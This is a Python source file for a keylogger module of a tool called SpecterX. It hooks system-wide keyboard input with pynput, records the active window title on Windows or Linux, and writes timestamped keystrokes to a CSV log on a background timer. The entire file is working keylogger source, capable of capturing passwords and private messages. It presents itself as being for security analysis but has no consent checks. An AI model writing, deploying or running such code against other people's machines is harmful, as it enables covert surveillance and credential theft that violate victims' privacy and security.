"""
keylogger.py - Keylogging module for SpecterX
Captures keyboard inputs and saves them to logs for security analysis
"""

import os
import csv
import time
import logging
import datetime
from pynput import keyboard
from threading import Thread, Event

class KeyLogger:
    def __init__(self, log_file="logs/keylog.csv"):
        """
        Initialize the keylogger with log file location
        
        Args:
            log_file (str): Path to the log file
        """
        self.log_file = log_file
        self.keys = []
        self.count = 0
        self.running = False
        self.stop_event = Event()
        self.current_window = "Unknown"
        self.logger = self._setup_logger()
        
        # Create log directory if it doesn't exist
        os.makedirs(os.path.dirname(log_file), exist_ok=True)
        
        # Check if log file exists, create with headers if not
        if not os.path.exists(log_file):
            with open(log_file, 'w', newline='') as f:
                writer = csv.writer(f)
                writer.writerow(['timestamp', 'window', 'keys'])

    def _setup_logger(self):
        """Configure logging for the keylogger module"""
        logger = logging.getLogger("KeyLogger")
        logger.setLevel(logging.INFO)
        
        # Create console handler with formatting
        if not logger.handlers:
            console_handler = logging.StreamHandler()
            console_handler.setLevel(logging.INFO)
            formatter = logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s')
            console_handler.setFormatter(formatter)
            logger.addHandler(console_handler)
        
        return logger

    def update_current_window(self):
        """
        Update the current active window title
        Note: This requires platform-specific implementations
        """
        try:
            # For Windows (requires pywin32)
            import win32gui
            window = win32gui.GetForegroundWindow()
            self.current_window = win32gui.GetWindowText(window)
        except ImportError:
            try:
                # For Linux (requires python-xlib)
                from Xlib import display
                d = display.Display()
                window = d.get_input_focus().focus
                wmname = window.get_wm_name()
                self.current_window = wmname if wmname else "Unknown"
            except ImportError:
                # If neither library is available
                self.current_window = "Unknown (platform detection failed)"

    def _on_press(self, key):
        """
        Callback for key press events
        
        Args:
            key: The key that was pressed
        """
        if self.stop_event.is_set():
            return False
            
        try:
            # For normal characters
            key_char = key.char
        except AttributeError:
            # For special keys
            key_char = str(key).replace("Key.", "<") + ">"
            
        self.keys.append(key_char)
        self.count += 1
        
        # Save keys periodically or when buffer gets large
        if self.count >= 20:
            self._write_to_log()
            
        return True

    def _write_to_log(self):
        """Write captured keys to the log file"""
        if not self.keys:
            return
            
        self.update_current_window()
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        key_string = ''.join(self.keys)
        
        try:
            with open(self.log_file, 'a', newline='') as f:
                writer = csv.writer(f)
                writer.writerow([timestamp, self.current_window, key_string])
                
            self.logger.info(f"Logged {len(self.keys)} keystrokes from {self.current_window}")
            self.keys = []
            self.count = 0
        except Exception as e:
            self.logger.error(f"Error writing to log file: {e}")

    def start(self):
        """Start the keylogger in a separate thread"""
        if self.running:
            self.logger.warning("Keylogger is already running")
            return False
            
        self.logger.info("Starting keylogger...")
        self.stop_event.clear()
        self.running = True
        
        # Start the listener in a separate thread
        self.listener = keyboard.Listener(on_press=self._on_press)
        self.listener.daemon = True
        self.listener.start()
        
        # Start a periodic logging thread
        self.log_thread = Thread(target=self._periodic_log)
        self.log_thread.daemon = True
        self.log_thread.start()
        
        self.logger.info("Keylogger started successfully")
        return True

    def _periodic_log(self):
        """Periodically write to log even if buffer isn't full"""
        while not self.stop_event.is_set():
            time.sleep(30)  # Write to log every 30 seconds
            if self.keys and not self.stop_event.is_set():
                self._write_to_log()

    def stop(self):
        """Stop the keylogger"""
        if not self.running:
            self.logger.warning("Keylogger is not running")
            return False
            
        self.logger.info("Stopping keylogger...")
        self.stop_event.set()
        
        # Final write of any remaining keys
        if self.keys:
            self._write_to_log()
            
        # Stop the listener
        if hasattr(self, 'listener') and self.listener.is_alive():
            self.listener.stop()
            
        self.running = False
        self.logger.info("Keylogger stopped successfully")
        return True
        
    def is_running(self):
        """Check if the keylogger is currently running"""
        return self.running

    def get_log_path(self):
        """Return the path to the log file"""
        return os.path.abspath(self.log_file)


# Function to create an instance of the keylogger
def create_keylogger(log_file="logs/keylog.csv"):
    """
    Create and return a keylogger instance
    
    Args:
        log_file (str): Path to the log file
        
    Returns:
        KeyLogger: An instance of the KeyLogger class
    """
    return KeyLogger(log_file)


# If this module is run directly, demonstrate functionality
if __name__ == "__main__":
    print("SpecterX KeyLogger Module Test")
    print("-----------------------------")
    
    keylogger = create_keylogger()
    keylogger.start()
    
    try:
        print("Keylogger active. Press keys to log them.")
        print("Press Ctrl+C to stop...")
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        keylogger.stop()
        print("\nKeylogger stopped.")
        print(f"Logs saved to: {keylogger.get_log_path()}")